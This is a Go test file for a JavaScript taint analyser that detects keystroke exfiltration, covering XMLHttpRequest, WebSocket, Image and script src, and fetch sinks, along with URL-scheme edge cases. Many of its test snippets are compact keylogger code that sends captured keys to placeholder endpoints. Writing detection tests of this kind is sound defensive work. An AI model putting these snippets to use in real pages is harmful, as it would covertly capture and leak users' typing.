package jstaint

import "testing"

// XMLHttpRequest: receiver provenance plus the open/send/setRequestHeader path
// state machine. A generic object with the same method names is never a sink.

func TestXHR_SendBodyTaintedIsDetected(t *testing.T) {
	src := `document.onkeydown=function(e){var x=new XMLHttpRequest();x.open("POST","/c");x.send(e.key);};`
	firstResult(t, src)
}

func TestXHR_OpenURLTaintedThenSendIsDetected(t *testing.T) {
	src := `document.onkeydown=function(e){var x=new XMLHttpRequest();x.open("POST","/c?k="+e.key);x.send("d");};`
	firstResult(t, src)
}

func TestXHR_SetRequestHeaderTaintedThenSendIsDetected(t *testing.T) {
	src := `document.onkeydown=function(e){var x=new XMLHttpRequest();x.open("POST","/c");` +
		`x.setRequestHeader("X-K",e.key);x.send("d");};`
	firstResult(t, src)
}

func TestXHR_AliasSendIsDetected(t *testing.T) {
	src := `document.onkeydown=function(e){var x=new XMLHttpRequest();var y=x;y.open("POST","/c");y.send(e.key);};`
	firstResult(t, src)
}

func TestXHR_OpenWithoutSendIsNotDetected(t *testing.T) {
	src := `document.onkeydown=function(e){var x=new XMLHttpRequest();x.open("POST","/c?k="+e.key);};`
	mustNotDetect(t, src)
}

func TestXHR_HeaderBeforeOpenIsNotDetected(t *testing.T) {
	src := `document.onkeydown=function(e){var x=new XMLHttpRequest();x.setRequestHeader("X-K",e.key);x.send("d");};`
	mustNotDetect(t, src)
}

func TestXHR_SendWithoutOpenIsNotDetected(t *testing.T) {
	src := `document.onkeydown=function(e){var x=new XMLHttpRequest();x.send(e.key);};`
	mustNotDetect(t, src)
}

func TestXHR_AbortClearsRememberedTaint(t *testing.T) {
	src := `document.onkeydown=function(e){var x=new XMLHttpRequest();x.open("POST","/c?k="+e.key);` +
		`x.abort();x.open("POST","/clean");x.send("d");};`
	mustNotDetect(t, src)
}

func TestXHR_CleanReopenResetsTaintedURL(t *testing.T) {
	src := `document.onkeydown=function(e){var x=new XMLHttpRequest();x.open("POST","/c?k="+e.key);` +
		`x.open("POST","/clean");x.send("d");};`
	mustNotDetect(t, src)
}

func TestXHR_GenericObjectSendIsNotASink(t *testing.T) {
	src := `document.onkeydown=function(e){var x={open:function(){},send:function(){},` +
		`setRequestHeader:function(){}};x.open("POST","/c");x.send(e.key);};`
	mustNotDetect(t, src)
}

func TestXHR_OpenRequiresMethodAndURL(t *testing.T) {
	src := `document.onkeydown=function(e){var x=new XMLHttpRequest();x.open("POST");x.send(e.key);};`
	mustNotDetect(t, src)
}

func TestXHR_AmbiguousReceiverCannotStronglyResetURL(t *testing.T) {
	src := `document.onkeydown=function(e){var x=new XMLHttpRequest();x.open("POST","/c?k="+e.key);` +
		`var other={open:function(){}};var target=window.p?x:other;` +
		`target.open("POST","/clean");x.send("d");};`
	firstResult(t, src)
}

func TestXHR_NonNetworkURLSuppressesWholeRequest(t *testing.T) {
	src := `document.onkeydown=function(e){var x=new XMLHttpRequest();` +
		`x.open("POST","DATA:text/plain,"+e.key);x.setRequestHeader("X-K",e.key);x.send(e.key);};`
	mustNotDetect(t, src)
}

func TestXHR_NetworkReopenRestoresRequestSinks(t *testing.T) {
	src := `document.onkeydown=function(e){var x=new XMLHttpRequest();x.open("POST","data:text/plain,x");` +
		`x.open("POST","/collect");x.send(e.key);};`
	firstResult(t, src)
}

func TestXHR_MergedNonNetworkSchemesSuppressRequest(t *testing.T) {
	src := `document.onkeydown=function(e){var x=new XMLHttpRequest();if(window.p){` +
		`x.open("POST","data:text/plain,a");}else{x.open("POST","DATA:text/plain,b");}x.send(e.key);};`
	mustNotDetect(t, src)
}

// WebSocket: constructor URL/protocols and send with connecting/open/closed
// path state.

func TestWebSocket_ConstructorURLTaintedIsDetected(t *testing.T) {
	src := `document.onkeydown=function(e){new WebSocket("wss://x/"+e.key);};`
	firstResult(t, src)
}

func TestWebSocket_ProtocolTaintedIsDetected(t *testing.T) {
	src := `document.onkeydown=function(e){new WebSocket("wss://x/",e.key);};`
	firstResult(t, src)
}

func TestWebSocket_SendInOnopenIsDetected(t *testing.T) {
	src := `var ws=new WebSocket("wss://x/");document.onkeydown=function(e){ws.send(e.key);};`
	firstResult(t, src)
}

func TestWebSocket_FreshConnectingSendIsNotDetected(t *testing.T) {
	src := `document.onkeydown=function(e){var ws=new WebSocket("wss://x/");ws.send(e.key);};`
	mustNotDetect(t, src)
}

func TestWebSocket_ClosedBeforeSendIsNotDetected(t *testing.T) {
	src := `var ws=new WebSocket("wss://x/");document.onkeydown=function(e){ws.close();ws.send(e.key);};`
	mustNotDetect(t, src)
}

func TestWebSocket_GenericObjectSendIsNotASink(t *testing.T) {
	src := `var ch={send:function(){}};document.onkeydown=function(e){ch.send(e.key);};`
	mustNotDetect(t, src)
}

func TestWebSocket_MissingURLCannotBecomeObservable(t *testing.T) {
	src := `var ws=new WebSocket();document.onkeydown=function(e){ws.send(e.key);};`
	mustNotDetect(t, src)
}

func TestWebSocket_AmbiguousCloseDoesNotCloseTrackedSocket(t *testing.T) {
	src := `var ws=new WebSocket("wss://x/");var other={close:function(){}};` +
		`document.onkeydown=function(e){var target=window.p?ws:other;target.close();ws.send(e.key);};`
	firstResult(t, src)
}

func TestWebSocket_NonNetworkURLSuppressesProtocols(t *testing.T) {
	src := `document.onkeydown=function(e){new WebSocket("data:text/plain,x",e.key);};`
	mustNotDetect(t, src)
}

// Typed resource element .src assignment.

func TestSrc_ImageSrcTaintedIsDetected(t *testing.T) {
	src := `document.onkeydown=function(e){var i=new Image();i.src="/c?k="+e.key;};`
	firstResult(t, src)
}

func TestSrc_CreateElementScriptSrcTaintedIsDetected(t *testing.T) {
	src := `document.onkeydown=function(e){var s=document.createElement("script");s.src="/c?k="+e.key;};`
	firstResult(t, src)
}

func TestSrc_StaticBracketSrcIsDetected(t *testing.T) {
	src := `document.onkeydown=function(e){var i=new Image();i["src"]="/c?k="+e.key;};`
	firstResult(t, src)
}

func TestSrc_GenericObjectSrcIsNotASink(t *testing.T) {
	src := `document.onkeydown=function(e){var o={};o.src="/c?k="+e.key;};`
	mustNotDetect(t, src)
}

func TestSrc_UnknownElementTypeIsNotASink(t *testing.T) {
	src := `document.onkeydown=function(e){var el=document.createElement(window.tag);el.src="/c?k="+e.key;};`
	mustNotDetect(t, src)
}

func TestSrc_NonResourceTagIsNotASink(t *testing.T) {
	// div is not a resource element that fetches its src.
	src := `document.onkeydown=function(e){var d=document.createElement("div");d.src="/c?k="+e.key;};`
	mustNotDetect(t, src)
}

func TestSrc_ShadowedDocumentIsNotAResourceFactory(t *testing.T) {
	src := `document.onkeydown=function(e){var document={createElement:function(){return {};}};` +
		`var i=document.createElement("img");i.src="/c?k="+e.key;};`
	mustNotDetect(t, src)
}

func TestSrc_LogicalAssignmentIsDetected(t *testing.T) {
	src := `var i=new Image();document.onkeydown=function(e){i.src||="/c?k="+e.key;};`
	firstResult(t, src)
}

func TestSrc_ForOfAssignmentIsDetected(t *testing.T) {
	src := `document.onkeydown=function(e){var i=new Image();for(i.src of [e.key]){}};`
	firstResult(t, src)
}

func TestSrc_AddAssignmentPreservesNonNetworkScheme(t *testing.T) {
	src := `var i=new Image();document.onkeydown=function(e){i.src="data:";i.src+=e.key;};`
	mustNotDetect(t, src)
}

// URL scheme lattice: a destination proven to use a non-network scheme is not a
// sink even when later bytes are tainted.

func TestScheme_DataURLDestinationIsNotDetected(t *testing.T) {
	mustNotDetect(t, `document.onkeydown=function(e){fetch("data:text/plain,"+e.key);};`)
}

func TestScheme_BlobImageSrcIsNotDetected(t *testing.T) {
	src := `document.onkeydown=function(e){var i=new Image();i.src="blob:"+e.key;};`
	mustNotDetect(t, src)
}

func TestScheme_RelativeURLStillDetected(t *testing.T) {
	firstResult(t, `document.onkeydown=function(e){fetch("/c?k="+e.key);};`)
}

func TestScheme_DataURLThroughVariableIsNotDetected(t *testing.T) {
	src := `document.onkeydown=function(e){var u="data:text/plain,"+e.key;fetch(u);};`
	mustNotDetect(t, src)
}

func TestScheme_NonNetworkURLSuppressesFetchBody(t *testing.T) {
	src := `document.onkeydown=function(e){fetch("file:///tmp/local",{body:e.key,referrer:e.key});};`
	mustNotDetect(t, src)
}

func TestScheme_AddAssignmentPreservesPrefix(t *testing.T) {
	src := `document.onkeydown=function(e){var u="data:text/plain,";u+=e.key;fetch(u);};`
	mustNotDetect(t, src)
}

func TestScheme_UpdateResetsPrefix(t *testing.T) {
	src := `document.onkeydown=function(e){var u="data:text/plain,";u++;u+=e.key;fetch(u);};`
	firstResult(t, src)
}

func TestScheme_TemplateWithoutSubstitutionPreservesPrefix(t *testing.T) {
	src := "document.onkeydown=function(e){var u=`data:text/plain,`;fetch(u+e.key);};"
	mustNotDetect(t, src)
}

func TestScheme_TemplateLeadingSubstitutionPreservesPrefix(t *testing.T) {
	src := "document.onkeydown=function(e){var u=\"data:text/plain,\";fetch(`${u}${e.key}`);};"
	mustNotDetect(t, src)
}

func TestScheme_AbsentVariablePathWidensToUnknown(t *testing.T) {
	src := `document.onkeydown=function(e){var u;if(window.p){u="data:text/plain,"+e.key;}fetch(u);};`
	firstResult(t, src)
}

func TestScheme_AbsentFieldPathWidensToUnknown(t *testing.T) {
	src := `document.onkeydown=function(e){var o={};if(window.p){o.u="data:text/plain,"+e.key;}fetch(o.u);};`
	firstResult(t, src)
}

func TestScheme_MixedConditionalWidensToUnknown(t *testing.T) {
	src := `document.onkeydown=function(e){var u=window.p?"data:text/plain,"+e.key:"/c?k="+e.key;fetch(u);};`
	firstResult(t, src)
}

func TestScheme_RewriteAllocationPreservesScheme(t *testing.T) {
	from := allocID{site: 1}
	to := allocID{site: 1, summary: true}
	holder := allocID{site: 2}
	wantScheme := schemeState{set: true, name: "data"}
	st := newState()
	st.heap[from] = &object{}
	st.heap[holder] = &object{fields: map[string]value{
		"url": {allocs: allocSet{{id: from}: true}, allocOnly: true, scheme: wantScheme},
	}}

	rewriteAlloc(st, from, to)

	got := st.heap[holder].fields["url"]
	if got.scheme != wantScheme || !hasAllocID(got.allocs, to) || hasAllocID(got.allocs, from) {
		t.Fatalf("rewritten value = %+v, want preserved scheme and summary allocation", got)
	}
}

func TestNav_LocationHrefIsNotASink(t *testing.T) {
	// The benign fetch admits the file for analysis; location.href is not a sink.
	mustNotDetect(t, `document.onkeydown=function(e){location.href="/c?k="+e.key;fetch("/x");};`)
}
